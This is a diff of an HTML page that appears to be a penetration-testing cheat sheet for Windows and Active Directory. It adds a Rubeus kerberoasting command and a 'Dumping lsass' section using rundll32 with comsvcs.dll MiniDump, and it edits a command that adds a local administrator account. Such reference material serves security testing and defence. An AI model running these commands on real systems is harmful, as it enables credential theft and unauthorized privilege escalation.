@@ -118,6 +118,8 @@
     
         <li><a class="" href="#extract-microsoft-update-files">Extract Microsoft Update files</a></li>
     
+        <li><a class="" href="#dumping-lsass">Dumping lsass</a></li>
+    
     </ul>
     
 
@@ -312,6 +314,10 @@ $ foreach($c in $computers) { echo &quot;$($c.name) ($($c.useraccountcontrol))&q
 </code></pre>
 
 <p><img alt="" src="https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png" /></p>
+<p>With <a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus</a>, it's possible to dump the hashes:</p>
+<pre><code class="language-bash">Rubeus.exe kerberoast /creduser:&quot;&lt;fqdn_dom&gt;\&lt;user&gt;&quot; /credpassword:&quot;&lt;password&gt;&quot; /domain:&quot;&lt;fqdn_dom&gt;&quot; /outfile:&quot;kerberoast.hash.txt&quot;
+</code></pre>
+
 <h3 id="collect-ad-users-information">Collect AD users information</h3>
 <pre><code class="language-powerhsell"># Helping functions
 function Get-ADUserDirectoryEntry($user) {
@@ -478,7 +484,7 @@ Converted 3948 frames
 <pre><code class="language-bash"># create a local user
 $ net user &lt;username&gt; &lt;password&gt; /add
 # add user to local admin group
-$ net localgroup Administrateur &lt;username&gt; /add
+$ net localgroup Administrators &lt;username&gt; /add
 </code></pre>
 
 <h3 id="extract-microsoft-update-files">Extract Microsoft Update files</h3>
@@ -487,6 +493,11 @@ contains the new binaries (<code>.dll</code>, <code>.exe</code>, ...). To extrac
 can use the <code>expand</code> command:</p>
 <pre><code class="language-bash">expand -f:* &quot;update.msu&quot; &quot;%temp%\\update.msu&quot;
 expand -f:* &quot;%temp%\\update.msu\\update.cab&quot; &quot;%temp%\\update.msu\\update.cab&quot;
+</code></pre>
+
+<h3 id="dumping-lsass">Dumping lsass</h3>
+<pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; lsass.dmp full
 </code></pre>
             
           </div>
